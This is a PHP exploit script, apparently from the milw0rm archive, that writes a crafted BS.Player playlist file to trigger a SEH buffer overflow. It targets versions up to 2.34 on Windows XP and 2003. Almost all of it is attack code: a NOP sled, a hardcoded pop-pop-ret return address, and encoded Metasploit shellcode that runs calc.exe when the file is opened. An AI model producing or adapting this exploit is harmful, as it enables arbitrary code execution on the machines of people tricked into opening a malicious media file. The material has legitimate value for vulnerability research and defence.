<?php
/*
Bs.Player <= 2.34 Build 980 (.bsl) local buffer overflow 0day exploit (seh)
by Nine:Situations:Group::pyrokinesis

Overlong hostnames in bsplayer playlist files causes eax and seh handlers to be
overwritten. Cannot reliably debug with olly because of code compression, just
used faultmon/memdump/msfpescan and I choosed the easy/universal way with seh.
There are some pop ret addresses in common among the vulnerable versions...

Well it says local but I consider it a remote one because .bsl files are
associated to the program
Tested and working against:

...
v2.32 Build 975 Free
v2.34 Build 980 PRO
win xp pro sp2 / sp3
win 2k3 sp1

not vulnerable:
v2.35 Build 985 PRO
V2.36 Build 990 Free/Pro


*/
$buffer=
"\x23\x45\x58\x54\x4d\x33\x55\x0d\x0a\x23\x45\x58\x54\x49\x4e\x46".
"\x3a\x30\x2c\x41\x41\x41\x41\x0d\x0a\x68\x74\x74\x70\x3a\x2f\x2f".
"\x52\x61\x77\x2d\x48\x69\x67\x68\x2e";

$nop1=str_repeat("\x90",384);
$eax_again="BBBB";
$nop2=str_repeat("\x90",12);
$eax="CCCC";
$nop3=str_repeat("\x90",8);
$jnk=$nop1.$eax_again.$nop2.$eax.$nop3;

$jmp="\xeb\x08\x90\x90";

$seh="\xb1\xad\x41\x00"; //0x0041adb1   pop pop ret bsplayer.exe

$nop4=str_repeat("\x90",100);

// win32_exec -  EXITFUNC=seh CMD=calc Size=330 Encoder=Alpha2 http://metasploit.com
$scode=
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49".
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x51\x5a\x6a\x47".
"\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x57\x32\x42\x42\x42\x32".
"\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x59\x79\x4b\x4c\x69".
"\x78\x37\x34\x67\x70\x45\x50\x75\x50\x6c\x4b\x61\x55\x45\x6c\x6e".
"\x6b\x71\x6c\x73\x35\x62\x58\x66\x61\x6a\x4f\x4c\x4b\x42\x6f\x56".
"\x78\x4c\x4b\x71\x4f\x77\x50\x57\x71\x6a\x4b\x72\x69\x6e\x6b\x75".
"\x64\x4e\x6b\x75\x51\x68\x6e\x30\x31\x59\x50\x4d\x49\x4c\x6c\x4f".
"\x74\x69\x50\x31\x64\x36\x67\x4f\x31\x4a\x6a\x44\x4d\x75\x51\x68".
"\x42\x38\x6b\x5a\x54\x35\x6b\x62\x74\x75\x74\x37\x74\x70\x75\x68".
"\x65\x4c\x4b\x51\x4f\x35\x74\x73\x31\x4a\x4b\x50\x66\x6c\x4b\x44".
"\x4c\x50\x4b\x6c\x4b\x41\x4f\x77\x6c\x34\x41\x7a\x4b\x6c\x4b\x67".
"\x6c\x6e\x6b\x37\x71\x6a\x4b\x4d\x59\x33\x6c\x71\x34\x54\x44\x39".
"\x53\x55\x61\x6f\x30\x41\x74\x6c\x4b\x37\x30\x70\x30\x6e\x65\x4b".
"\x70\x61\x68\x66\x6c\x6e\x6b\x61\x50\x36\x6c\x6e\x6b\x74\x30\x65".
"\x4c\x6e\x4d\x6c\x4b\x71\x78\x64\x48\x68\x6b\x76\x69\x6c\x4b\x4f".
"\x70\x48\x30\x75\x50\x75\x50\x55\x50\x4e\x6b\x63\x58\x67\x4c\x31".
"\x4f\x56\x51\x4a\x56\x53\x50\x41\x46\x4f\x79\x4b\x48\x4b\x33\x39".
"\x50\x61\x6b\x32\x70\x53\x58\x6c\x30\x4c\x4a\x65\x54\x53\x6f\x63".
"\x58\x7a\x38\x49\x6e\x4e\x6a\x54\x4e\x70\x57\x69\x6f\x58\x67\x62".
"\x43\x72\x41\x70\x6c\x70\x63\x43\x30\x47";

$buffer.=$jnk.$jmp.$seh.$nop4.$scode;
$buffer.=
"x56\x37\x2e\x46\x4d\x2f\x6c\x69\x73\x74\x65\x6e\x2e\x70".
"\x6c\x73\x0d\x0a\x00";

$fp=fopen("evil.bsl","w+");
if (!$fp) {die("cannot create evil.bsl!");}
@fputs($fp,$buffer);
@fclose($fp);
?>

# milw0rm.com [2009-03-20]
